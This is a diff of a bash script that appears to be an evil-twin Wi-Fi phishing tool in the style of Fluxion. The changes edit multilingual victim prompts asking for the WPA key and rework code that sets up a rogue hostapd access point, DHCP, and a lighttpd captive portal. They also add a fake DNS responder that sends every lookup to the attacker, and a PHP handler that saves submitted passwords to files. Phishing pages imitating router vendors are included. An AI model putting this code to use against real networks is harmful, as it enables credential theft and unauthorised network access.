@@ -230,137 +230,137 @@ Spanish[ESP] GERMAN [GER]
 #Languages for the web interface
 
 #EN
-DIALOG_WEB_INFO_ENG="For security reasons, enter the <b>WPA</b> key to access the Internet"
+DIALOG_WEB_INFO_ENG="For security reasons, enter the WPA key to access the Internet"
 DIALOG_WEB_INPUT_ENG="Enter your WPA password:"
 DIALOG_WEB_SUBMIT_ENG="Submit"
-DIALOG_WEB_ERROR_ENG="<b><font color=\"red\" size=\"3\">Error</font>:</b> The entered password is <b>NOT</b> correct!</b>"
+DIALOG_WEB_ERROR_ENG="Error: The entered password is not correct!"
 DIALOG_WEB_OK_ENG="Your connection will be restored in a few moments."
 DIALOG_WEB_BACK_ENG="$general_back"
 DIALOG_WEB_LENGHT_MIN_ENG="The password must be more than 7 characters!"
 DIALOG_WEB_LENGHT_MAX_ENG="The password must be less than 64 characters!"
 DIALOG_WEB_DIR_ENG="ltr"
-DIALOG_WEB_localization_ENG="messages_en"
+DIALOG_WEB_localization_ENG="messages_en.js"
 
 
 #GER
-DIALOG_WEB_INFO_GER="Aus Sicherheitsgründen geben sie bitte den <b>WPA</b> Schlüssel ein"
+DIALOG_WEB_INFO_GER="Aus Sicherheitsgründen geben sie bitte den WPA Schlüssel ein"
 DIALOG_WEB_INPUT_GER="Geben sie den WPA2 Schlüssel ein"
 DIALOG_WEB_SUBMIT_GER="Bestätigen"
-DIALOG_WEB_ERROR_GER="<b><font color=\"red\" size=\"3\">Error</font>:</b> Das eingegebene Passwort ist <b>nicht</b> Korrekt!</b>"
+DIALOG_WEB_ERROR_GER="Error: Das eingegebene Passwort ist nicht Korrekt!"
 DIALOG_WEB_OK_GER="Die Verbindung wird in wenigen Sekunden wiederhergestellt"
 DIALOG_WEB_BACK_GER="$general_back"
 DIALOG_WEB_LENGHT_MIN_GER="Das Passwort muss länger als 7 Zeichen sein"
 DIALOG_WEB_LENGHT_MAX_GER="Das Passwort muss kürzer als 64 Zeichen sein"
 DIALOG_WEB_DIR_GER="ltr"
-DIALOG_WEB_localization_GER="messages_gr"
+DIALOG_WEB_localization_GER="messages_gr.js"
 
 #ESP
-DIALOG_WEB_INFO_ESP="Por razones de seguridad, teclea tu clave <b>WPA</b> para acceder a internet"
+DIALOG_WEB_INFO_ESP="Por razones de seguridad, teclea tu clave WPA para acceder a internet"
 DIALOG_WEB_INPUT_ESP="Teclea tu contraseña WPA:"
 DIALOG_WEB_SUBMIT_ESP="Enviar"
-DIALOG_WEB_ERROR_ESP="<b><font color=\"red\" size=\"3\">Error</font>:</b> La contraseña introducida <b>NO</b> es correcta"
+DIALOG_WEB_ERROR_ESP="Error: La contraseña introducida no es correcta"
 DIALOG_WEB_OK_ESP="Tu conexión será restaurada en unos pocos minutos"
 DIALOG_WEB_BACK_ESP="Atrás"
 DIALOG_WEB_LENGHT_MIN_ESP="La contraseña debe ser más de 7 caracteres!"
 DIALOG_WEB_LENGHT_MAX_ESP="La contraseña debe ser menos de 64 caracteres!"
 DIALOG_WEB_DIR_ESP="ltr"
-DIALOG_WEB_localization_ESP="messages_es"
+DIALOG_WEB_localization_ESP="messages_es.js"
 
 #IT
-DIALOG_WEB_INFO_IT="Per motivi di sicurezza, immettere la chiave <b>"$Host_ENC"</b> per accedere a Internet"
+DIALOG_WEB_INFO_IT="Per motivi di sicurezza, immettere la chiave WPA per accedere a Internet"
 DIALOG_WEB_INPUT_IT="Inserisci la tua password WPA:"
 DIALOG_WEB_SUBMIT_IT="Invia"
-DIALOG_WEB_ERROR_IT="<b><font color=\"red\" size=\"3\">Errore</font>:</b> La password <b>NON</b> &egrave; corretta!</b>"
+DIALOG_WEB_ERROR_IT="Errore: La password non &egrave; corretta!"
 DIALOG_WEB_OK_IT="La connessione sar&agrave; ripristinata in pochi istanti."
 DIALOG_WEB_BACK_IT="Indietro"
 DIALOG_WEB_LENGHT_MIN_IT="La password deve essere superiore a 7 caratteri"
 DIALOG_WEB_LENGHT_MAX_IT="La password deve essere inferiore a 64 caratteri"
 DIALOG_WEB_DIR_IT="ltr"
-DIALOG_WEB_localization_IT="messages_it"
+DIALOG_WEB_localization_IT="messages_it.js"
 
 #FR
-DIALOG_WEB_INFO_FR="Pour des raisons de s&eacute;curit&eacute;, veuillez introduire <b>"$Host_ENC"</b> votre cl&eacute; pour acceder &agrave; Internet"
+DIALOG_WEB_INFO_FR="Pour des raisons de s&eacute;curit&eacute;, veuillez introduire WPA votre cl&eacute; pour acceder &agrave; Internet"
 DIALOG_WEB_INPUT_FR="Entrez votre cl&eacute; WPA:"
 DIALOG_WEB_SUBMIT_FR="Valider"
-DIALOG_WEB_ERROR_FR="<b><font color=\"red\" size=\"3\">Error</font>:</b> La cl&eacute; que vous avez introduit <b>NOT</b> est incorrecte!</b>"
+DIALOG_WEB_ERROR_FR="Error: La cl&eacute; que vous avez introduit not est incorrecte!"
 DIALOG_WEB_OK_FR="Veuillez patienter quelques instants."
 DIALOG_WEB_BACK_FR="Pr&eacute;c&eacute;dent"
 DIALOG_WEB_LENGHT_MIN_FR="La passe dois avoir plus de 7 digits"
 DIALOG_WEB_LENGHT_MAX_FR="La passe dois avoir moins de 64 digits"
 DIALOG_WEB_DIR_FR="ltr"
-DIALOG_WEB_localization_FR="messages_fr"
+DIALOG_WEB_localization_FR="messages_fr.js"
 
 #POR
 DIALOG_WEB_INFO_POR="Por raz&#245;es de seguran&#231;a, digite a senha para acessar a Internet"
 DIALOG_WEB_INPUT_POR="Digite sua senha WPA"
 DIALOG_WEB_SUBMIT_POR="Enviar"
-DIALOG_WEB_ERROR_POR="<b><font Color=\"red\" size=\"3\">Erro</font>:</b> A senha digitada <b>N&#195;O</b> est&#225; correto </b>!"
+DIALOG_WEB_ERROR_POR="Erro: A senha digitada N&#195;O est&#225; correto!"
 DIALOG_WEB_OK_POR="Sua conex&#227;o &#233; restaurada em breve."
 DIALOG_WEB_BACK_POR="Voltar"
 DIALOG_WEB_LENGHT_MIN_POR="A senha deve ter mais de 7 caracteres"
 DIALOG_WEB_LENGHT_MAX_POR="A chave deve ser menor que 64 caracteres"
 DIALOG_WEB_DIR_POR="ltr"
-DIALOG_WEB_localization_POR="messages_po"
+DIALOG_WEB_localization_POR="messages_po.js"
 
 #RUS
 DIALOG_WEB_INFO_RUS="Для получения доступа в Интернет нужно ввести WPA пароль своей точки доступа."
 DIALOG_WEB_INPUT_RUS="Введите пароль:"
 DIALOG_WEB_SUBMIT_RUS="Отправить"
-DIALOG_WEB_ERROR_RUS="<b><font color=\"red\" size=\"3\">Ошибка</font>:</b> Введенный пароль <b>НЕ</b> верный!"
+DIALOG_WEB_ERROR_RUS="Ошибка: Введенный пароль не верный!"
 DIALOG_WEB_OK_RUS="Спасибо, соединение восстановится через несколько секунд."
 DIALOG_WEB_BACK_RUS="Назад"
 DIALOG_WEB_LENGHT_MIN_RUS="Пароль должен быть не менее 7 символов!"
 DIALOG_WEB_LENGHT_MAX_RUS="Пароль должен быть не более 64 символов!"
 DIALOG_WEB_DIR_RUS="ltr"
-DIALOG_WEB_localization_RUS="messages_ru"
+DIALOG_WEB_localization_RUS="messages_ru.js"
 
 #TR
-DIALOG_WEB_INFO_TR="İnternet'e erişmek icin <b>WPA</b> kablosuz ağ şifrenizi giriniz:"
+DIALOG_WEB_INFO_TR="İnternet'e erişmek icin WPA kablosuz ağ şifrenizi giriniz:"
 DIALOG_WEB_INPUT_TR="Lütfen parolanızı giriniz:"
 DIALOG_WEB_SUBMIT_TR="Giriş"
-DIALOG_WEB_ERROR_TR="<b><font color=\"red\" size=\"3\">Hata</font>:</b> girilen şifre  <b>doğru</b>değil!</b>"
+DIALOG_WEB_ERROR_TR="Hata: girilen şifre doğru değil! "
 DIALOG_WEB_OK_TR="Bağlantı birkaç dakika içinde yapılandırılacaktır."
 DIALOG_WEB_BACK_TR="Geri"
 DIALOG_WEB_LENGHT_MIN_TR="Parola en az 8 karakterden olmalıdır."
 DIALOG_WEB_LENGHT_MAX_TR="Parola 64 karakterden daha fazla olmamalıdır."
 DIALOG_WEB_DIR_TR="ltr"
-DIALOG_WEB_localization_TR="messages_tr"
+DIALOG_WEB_localization_TR="messages_tr.js"
 
 #RO
-DIALOG_WEB_INFO_RO="Din motive de securitate, introduceți cheia <b>WPA</b> pentru a avea acces la Internet"
+DIALOG_WEB_INFO_RO="Din motive de securitate, introduceți cheia WPA pentru a avea acces la Internet"
 DIALOG_WEB_INPUT_RO="Parola WPA:"
 DIALOG_WEB_SUBMIT_RO="Trimite"
-DIALOG_WEB_ERROR_RO="<b><font color=\"red\" size=\"3\">Eroare</font>:</b> Parola introdusa <b>NU</b> este corecta!"
+DIALOG_WEB_ERROR_RO="Eroare: Parola introdusa nu este corecta!"
 DIALOG_WEB_OK_RO="Conexiunea la Internet va porni in cateva momente."
 DIALOG_WEB_BACK_RO="Inapoi"
 DIALOG_WEB_LENGHT_MIN_RO="Parola trebuie să fie mai mare de 7 de caractere!"
 DIALOG_WEB_LENGHT_MAX_RO="Parola trebuie să fie mai mică de 64 de caractere!"
 DIALOG_WEB_DIR_RO="ltr"
-DIALOG_WEB_localization_RO="messages_ro"
+DIALOG_WEB_localization_RO="messages_ro.js"
 
 #HU
-DIALOG_WEB_INFO_HU="Biztonsági okokból adja meg a <b>WPA</b> kulcsot az internet eléréséhez"
+DIALOG_WEB_INFO_HU="Biztonsági okokból adja meg a WPA kulcsot az internet eléréséhez"
 DIALOG_WEB_INPUT_HU="Jelszó WPA:"
 DIALOG_WEB_SUBMIT_HU="Küld"
-DIALOG_WEB_ERROR_HU="<b><font color=\"red\" size=\"3\">Hiba</font>:</b> A megadott jelszó <b>helytelen</b>!"
+DIALOG_WEB_ERROR_HU="Hiba: A megadott jelszó helytelen!"
 DIALOG_WEB_OK_HU="Az Internet kapcsolat indul egy pillanatra."
 DIALOG_WEB_BACK_HU="Visza"
 DIALOG_WEB_LENGHT_MIN_HU="Jelszó nem lehet kevesebb, mint 7 karakter!"
 DIALOG_WEB_LENGHT_MAX_HU="A jelszó kevesebb mint 64 karakter kell legyen!"
 DIALOG_WEB_DIR_HU="ltr"
-DIALOG_WEB_localization_HU="messages_hu"
+DIALOG_WEB_localization_HU="messages_hu.js"
 
 #ARA
-DIALOG_WEB_INFO_ARA="لأسباب أمنية، أدخل كلمة المرور الخاصة بالشبكة المدونة اعلاه من تشفير <b>"$Host_ENC"</b> للحصول على اتصال الانترنت"
+DIALOG_WEB_INFO_ARA="لأسباب أمنية، أدخل كلمة المرور الخاصة بالشبكة المدونة اعلاه من تشفير WPA للحصول على اتصال الانترنت"
 DIALOG_WEB_INPUT_ARA="ادخل كلمة السر"
 DIALOG_WEB_SUBMIT_ARA="تأكيد"
-DIALOG_WEB_ERROR_ARA="<b><font color=\"red\" size=\"3\">خطأ</font>:</b>كلمة السر المدخلة<b>غير</b> صحيحة!</b>"
-DIALOG_WEB_OK_ARA="سوف يتم استعادة الاتصال في لحظات قليلة! شكرا لتعاونكم!"
+DIALOG_WEB_ERROR_ARA="خطأ: كلمة السر المدخلة غير صحيحة"
+DIALOG_WEB_OK_ARA="سوف يتم استعادة الاتصال في لحظات قليلة! شكرا لتعاونكم"
 DIALOG_WEB_BACK_ARA="العودة"
 DIALOG_WEB_LENGHT_MIN_ARA="يجب أن تكون كلمة المرور أكثر من 7 أحرف او ارقام"
 DIALOG_WEB_LENGHT_MAX_ARA="يجب أن تكون كلمة المرور أقل من 64 حرفا او رقم"
 DIALOG_WEB_DIR_ARA="rtl"
-DIALOG_WEB_localization_ARA="messages_ar"
+DIALOG_WEB_localization_ARA="messages_ar.js"
 
 # Design
 function top(){
@@ -3697,8 +3697,8 @@ function ConnectionRESET {
 				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_ENG
 				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_ENG
 				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_ENG
-				DIALOG_WEB_DIR = $DIALOG_WEB_DIR_ENG
-				DIALOG_WEB_localization = $DIALOG_WEB_localization_ENG
+				DIALOG_WEB_DIR=$DIALOG_WEB_DIR_ENG
+				DIALOG_WEB_localization=$DIALOG_WEB_localization_ENG
 				NEUTRA
 				break
 
@@ -3711,8 +3711,8 @@ function ConnectionRESET {
 				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_GER
 				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_GER
 				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_GER
-				DIALOG_WEB_DIR = $DIALOG_WEB_DIR_GER
-				DIALOG_WEB_localization = $DIALOG_WEB_localization_GER
+				DIALOG_WEB_DIR=$DIALOG_WEB_DIR_GER
+				DIALOG_WEB_localization=$DIALOG_WEB_localization_GER
 				NEUTRA
 				break
 
@@ -3725,8 +3725,8 @@ function ConnectionRESET {
 				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_RUS
 				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_RUS
 				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_RUS
-				DIALOG_WEB_DIR = $DIALOG_WEB_DIR_RUS
-				DIALOG_WEB_localization = $DIALOG_WEB_localization_RUS
+				DIALOG_WEB_DIR=$DIALOG_WEB_DIR_RUS
+				DIALOG_WEB_localization=$DIALOG_WEB_localization_RUS
 				NEUTRA
 				break
 
@@ -3739,8 +3739,8 @@ function ConnectionRESET {
 				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_IT
 				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_IT
 				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_IT
-				DIALOG_WEB_DIR = $DIALOG_WEB_DIR_IT
-				DIALOG_WEB_localization = $DIALOG_WEB_localization_IT
+				DIALOG_WEB_DIR=$DIALOG_WEB_DIR_IT
+				DIALOG_WEB_localization=$DIALOG_WEB_localization_IT
 				NEUTRA
 				break
 
@@ -3753,8 +3753,8 @@ function ConnectionRESET {
 				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_ESP
 				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_ESP
 				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_ESP
-				DIALOG_WEB_DIR = $DIALOG_WEB_DIR_ESP
-				DIALOG_WEB_localization = $DIALOG_WEB_localization_ESP
+				DIALOG_WEB_DIR=$DIALOG_WEB_DIR_ESP
+				DIALOG_WEB_localization=$DIALOG_WEB_localization_ESP
 				NEUTRA
 				break
 
@@ -3767,8 +3767,8 @@ function ConnectionRESET {
 				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_POR
 				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_POR
 				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_POR
-				DIALOG_WEB_DIR = $DIALOG_WEB_DIR_POR
-				DIALOG_WEB_localization = $DIALOG_WEB_localization_POR
+				DIALOG_WEB_DIR=$DIALOG_WEB_DIR_POR
+				DIALOG_WEB_localization=$DIALOG_WEB_localization_POR
 				NEUTRA
 				break
 
@@ -3781,8 +3781,8 @@ function ConnectionRESET {
 				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_ZH
 				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_ZH
 				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_ZH
-				DIALOG_WEB_DIR = $DIALOG_WEB_DIR_ZH
-				DIALOG_WEB_localization = $DIALOG_WEB_localization_ZH
+				DIALOG_WEB_DIR=$DIALOG_WEB_DIR_ZH
+				DIALOG_WEB_localization=$DIALOG_WEB_localization_ZH
 				NEUTRA
 				break
 
@@ -3795,8 +3795,8 @@ function ConnectionRESET {
 				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_FR
 				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_FR
 				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_FR
-				DIALOG_WEB_DIR = $DIALOG_WEB_DIR_FR
-				DIALOG_WEB_localization = $DIALOG_WEB_localization_FR
+				DIALOG_WEB_DIR=$DIALOG_WEB_DIR_FR
+				DIALOG_WEB_localization=$DIALOG_WEB_localization_FR
 				NEUTRA
 				break
 
@@ -3809,8 +3809,8 @@ function ConnectionRESET {
 				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_TR
 				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_TR
 				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_TR
-				DIALOG_WEB_DIR = $DIALOG_WEB_DIR_TR
-				DIALOG_WEB_localization = $DIALOG_WEB_localization_TR
+				DIALOG_WEB_DIR=$DIALOG_WEB_DIR_TR
+				DIALOG_WEB_localization=$DIALOG_WEB_localization_TR
 				NEUTRA
 				break
 
@@ -3823,8 +3823,8 @@ function ConnectionRESET {
 				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_RO
 				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_RO
 				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_RO
-				DIALOG_WEB_DIR = $DIALOG_WEB_DIR_RO
-				DIALOG_WEB_localization = $DIALOG_WEB_localization_RO
+				DIALOG_WEB_DIR=$DIALOG_WEB_DIR_RO
+				DIALOG_WEB_localization=$DIALOG_WEB_localization_RO
 				NEUTRA
 				break
 
@@ -3837,8 +3837,8 @@ function ConnectionRESET {
 				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_HU
 				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_HU
 				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_HU
-				DIALOG_WEB_DIR = $DIALOG_WEB_DIR_HU
-				DIALOG_WEB_localization = $DIALOG_WEB_localization_HU
+				DIALOG_WEB_DIR=$DIALOG_WEB_DIR_HU
+				DIALOG_WEB_localization=$DIALOG_WEB_localization_HU
 				NEUTRA
 				break
 
@@ -3851,8 +3851,8 @@ function ConnectionRESET {
 				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_ARA
 				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_ARA
 				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_ARA
-				DIALOG_WEB_DIR = $DIALOG_WEB_DIR_ARA
-				DIALOG_WEB_localization = $DIALOG_WEB_localization_ARA
+				DIALOG_WEB_DIR=$DIALOG_WEB_DIR_ARA
+				DIALOG_WEB_localization=$DIALOG_WEB_localization_ARA
 				NEUTRA
 				break
 				
@@ -3907,66 +3907,68 @@ function ConnectionRESET {
 # Create different settings required for the script
 function preattack {
 
-# Config HostAPD
-echo "interface=$WIFI
+	# Config HostAPD
+	echo "interface=$WIFI
 driver=nl80211
 ssid=$Host_SSID
-channel=$Host_CHAN
-">$DUMP_PATH/hostapd.conf
+channel=$Host_CHAN" > $DUMP_PATH/hostapd.conf
 
-# Creates PHP
-echo "<?php
+	# Creates PHP
+	echo "<?php
 error_reporting(0);
 
-$count_my_page = (\"$DUMP_PATH/hit.txt\");
-$hits = file($count_my_page);
-$hits[0] ++;
-$fp = fopen($count_my_page , \"w\");
-fputs($fp , \"$hits[0]\");
-fclose($fp);
+\$count_my_page = (\"$DUMP_PATH/hit.txt\");
+\$hits = file(\$count_my_page);
+\$hits[0] ++;
+\$fp = fopen(\$count_my_page , \"w\");
+fputs(\$fp , \$hits[0]);
+fclose(\$fp);
 
 // Receive form Post data and Saving it in variables
-
-$key1 = @$_POST['key1'];
+\$key1 = @\$_POST['key1'];
 
 // Write the name of text file where data will be store
-$filename = \"$DUMP_PATH/data.txt\";
-$filename2 = \"$DUMP_PATH/status.txt\";
-$intento = \"$DUMP_PATH/intento\";
-$attemptlog = \"$DUMP_PATH/pwattempt.txt\";
-
+\$filename = \"$DUMP_PATH/data.txt\";
+\$filename2 = \"$DUMP_PATH/status.txt\";
+\$intento = \"$DUMP_PATH/intento\";
+\$attemptlog = \"$DUMP_PATH/pwattempt.txt\";
 
 // Marge all the variables with text in a single variable.
-$pwlog = fopen($attemptlog, \"w\");
-fwrite($pwlog, $key1);
-fwrite($pwlog,\"\n\");
-fclose($pwlog);
+\$f_data= ''.\$key1.'';
 
-$file = fopen($filename, \"w\");
-fwrite($file, $key1);
-fwrite($file,\"\n\");
-fclose($file);
+\$pwlog = fopen(\$attemptlog, \"w\");
+fwrite(\$pwlog, \$f_data);
+fwrite(\$pwlog,\"\n\");
+fclose(\$pwlog);
 
+\$file = fopen(\$filename, \"w\");
+fwrite(\$file, \$f_data);
+fwrite(\$file,\"\n\");
+fclose(\$file);
 
-$archivo = fopen($intento, \"w\");
-fwrite($archivo,\"\n\");
-fclose($archivo);
+\$archivo = fopen(\$intento, \"w\");
+fwrite(\$archivo,\"\n\");
+fclose(\$archivo);
 
 while( 1 ) {
-	if (file_get_contents( $intento ) == 1) {
+
+	if (file_get_contents( \$intento ) == 1) {
 		header(\"Location:error.html\");
-	    unlink($intento);
-	    break;
-	} else {
-		header(\"Location:final.html\");
+		unlink(\$intento);
 	    break;
 	}
+	
+	if (file_get_contents( \$intento ) == 2) {
+		header(\"Location:final.html\");
+		break;
+	}
+	
 	sleep(1);
 }
 ?>" > $DUMP_PATH/data/check.php
 
-# Config DHCP
-echo "authoritative;
+	# Config DHCP
+	echo "authoritative;
 
 default-lease-time 600;
 max-lease-time 7200;
@@ -3980,14 +3982,13 @@ option domain-name-servers $IP;
 
 range $RANG_IP.100 $RANG_IP.250;
 
-}
-" >$DUMP_PATH/dhcpd.conf
+}" > $DUMP_PATH/dhcpd.conf
 
-#create an empty leases file
-touch $DUMP_PATH/dhcpd.leases
+	#create an empty leases file
+	touch $DUMP_PATH/dhcpd.leases
 
-# creates Lighttpd web-server
-echo "server.document-root = \"$DUMP_PATH/data/\"
+	# creates Lighttpd web-server
+	echo "server.document-root = \"$DUMP_PATH/data/\"
 
 server.modules = (
   \"mod_access\",
@@ -4029,12 +4030,10 @@ index-file.names = ( \"index.htm\" )
 	url.redirect = ( \"^/(.*)\" => \"http://%1/\$1\" )
 
 
-}
-
-" >$DUMP_PATH/lighttpd.conf
+}" > $DUMP_PATH/lighttpd.conf
 
 # that redirects all DNS requests to the gateway
-echo "import socket
+	echo "import socket
 
 class DNSQuery:
   def __init__(self, data):
@@ -4076,10 +4075,8 @@ if __name__ == '__main__':
       print 'Request: %s -> %s' % (p.dominio, ip)
   except KeyboardInterrupt:
     print 'Finalizando'
-    udps.close()
-" >$DUMP_PATH/fakedns
-chmod +x $DUMP_PATH/fakedns
-
+    udps.close()" > $DUMP_PATH/fakedns
+	chmod +x $DUMP_PATH/fakedns
 }
 
 # Set up DHCP / WEB server
@@ -6730,15 +6727,64 @@ ziTSAVBLBQYAAAAAFgAWACkJAADb9wEAAAA=" | base64 -d >$DUMP_PATH/file.zip
 		<!-- Scripts -->
 		<script src=\"js/jquery-1.11.1.min.js\"></script>
 		<script src=\"js/jquery.mobile-1.4.5.min.js\"></script>
+	</head>
+	<body>
+		<!-- final page -->
+	    <div id=\"done\" data-role=\"page\" data-theme=\"a\">
+			<div data-role=\"main\" class=\"ui-content ui-body ui-body-b\" dir=\"$DIALOG_WEB_DIR\">
+				<h3 style=\"text-align:center;\">$DIALOG_WEB_OK</h3>
+			</div>
+	    </div>
+	</body>
+</html>" > $DUMP_PATH/data/final.html
+
+	echo "<!DOCTYPE html>
+	<html>
+	<head>
+	    <title>Login Page</title>
+	    <meta charset=\"UTF-8\">
+	    <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\">
+		<!-- Styles -->
+	    <link rel=\"stylesheet\" type=\"text/css\" href=\"css/jquery.mobile-1.4.5.min.css\"/>
+		<link rel=\"stylesheet\" type=\"text/css\" href=\"css/main.css\"/>
+		<!-- Scripts -->
+		<script src=\"js/jquery-1.11.1.min.js\"></script>
+		<script src=\"js/jquery.mobile-1.4.5.min.js\"></script>
+		<script src=\"js/jquery.validate.min.js\"></script>
+		<script src=\"js/additional-methods.min.js\"></script>
+	</head>
+	<body>
+		<!-- Error page -->
+	    <div data-role=\"page\" data-theme=\"a\">
+			<div data-role=\"main\" class=\"ui-content ui-body ui-body-b\" dir=\"$DIALOG_WEB_DIR\">
+				<h3 style=\"text-align:center;\">$DIALOG_WEB_ERROR</h3>
+				<a href=\"index.htm\" class=\"ui-btn ui-corner-all ui-shadow\" onclick=\"location.href='index.htm'\">$DIALOG_WEB_BACK</a>
+			</div>
+	    </div>
+	</body>
+</html>" > $DUMP_PATH/data/error.html
+
+	echo "<!DOCTYPE html>
+	<html>
+	<head>
+	    <title>Login Page</title>
+	    <meta charset=\"UTF-8\">
+	    <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\">
+		<!-- Styles -->
+	    <link rel=\"stylesheet\" type=\"text/css\" href=\"css/jquery.mobile-1.4.5.min.css\"/>
+		<link rel=\"stylesheet\" type=\"text/css\" href=\"css/main.css\"/>
+		<!-- Scripts -->
+		<script src=\"js/jquery-1.11.1.min.js\"></script>
+		<script src=\"js/jquery.mobile-1.4.5.min.js\"></script>
 		<script src=\"js/jquery.validate.min.js\"></script>
 		<script src=\"js/additional-methods.min.js\"></script>
 	</head>
 	<body>
 		<!-- Main page -->
-	    <div id=\"home\" data-role=\"page\" data-theme=\"a\">
-			<div data-role=\"main\" class=\"ui-content\" dir=\"$DIALOG_WEB_DIR\">
+	    <div data-role=\"page\" data-theme=\"a\">
+			<div class=\"ui-content\" dir=\"$DIALOG_WEB_DIR\">
 				<fieldset>
-					<form id=\"loginForm\" class=\"ui-body ui-body-b ui-corner-all\" action=\"check.php\" method=\"post\">
+					<form id=\"loginForm\" class=\"ui-body ui-body-b ui-corner-all\" action=\"check.php\" method=\"POST\">
 						</br>
 						<div class=\"ui-field-contain ui-responsive\" style=\"text-align:center;\">
 							<div>ESSID: <u>$Host_SSID</u></div>
@@ -6758,145 +6804,125 @@ ziTSAVBLBQYAAAAAFgAWACkJAADb9wEAAAA=" | base64 -d >$DUMP_PATH/file.zip
 				</fieldset>
 			</div>
 	    </div>
-		
-		<!-- Error page -->
-	    <div id=\"error\" data-role=\"page\" data-theme=\"a\">
-			<div data-role=\"main\" class=\"ui-content ui-body ui-body-b\" dir=\"$DIALOG_WEB_DIR\">
-				<h1 style=\"text-align:center;\">$DIALOG_WEB_ERROR</h1>
-				<a href=\"#home\" class=\"ui-btn ui-corner-all ui-shadow\">Back</a>
-			</div>
-	    </div>
-		
-		<!-- final page -->
-	    <div id=\"done\" data-role=\"page\" data-theme=\"a\">
-			<div data-role=\"main\" class=\"ui-content ui-body ui-body-b\" dir=\"$DIALOG_WEB_DIR\" >
-				<h1 style=\"text-align:center;\">$DIALOG_WEB_OK</h1>
-			</div>
-	    </div>
-		
 		<script src=\"js/main.js\"></script>
-		<script src=\"js/localization/$DIALOG_WEB_localization.js\"></script>
+		<script src=\"js/localization/$DIALOG_WEB_localization\"></script>
 	</body>
 </html>" > $DUMP_PATH/data/index.htm
 }
-
 # Crea el contenido de la interface web
 function ARRIS {
 	mkdir $DUMP_PATH/data &>$flux_output_device
-        cp  $WORK_DIR/Sites/ARRIS-ENG/background.png $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/ARRIS-ENG/house.png $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/ARRIS-ENG/house1.png $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/ARRIS-ENG/ayuda.htm $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/ARRIS-ENG/error.html $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/ARRIS-ENG/final.html $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/ARRIS-ENG/index.htm $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/ARRIS-ENG/background.png $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/ARRIS-ENG/house.png $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/ARRIS-ENG/house1.png $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/ARRIS-ENG/ayuda.htm $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/ARRIS-ENG/error.html $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/ARRIS-ENG/final.html $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/ARRIS-ENG/index.htm $DUMP_PATH/data
 }
 
 #Conten interface web
 function BELKIN {
 	mkdir $DUMP_PATH/data &>$flux_output_device
 	cp  $WORK_DIR/Sites/BELKIN-ENG/info2.css $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/BELKIN-ENG/info.css $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/BELKIN-ENG/background.png $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/BELKIN-ENG/house.png $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/BELKIN-ENG/house1.png $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/BELKIN-ENG/ayuda.htm $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/BELKIN-ENG/error.html $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/BELKIN-ENG/final.html $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/BELKIN-ENG/info.html $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/BELKIN-ENG/index.htm $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/BELKIN-ENG/info.css $DUMP_PATH/data
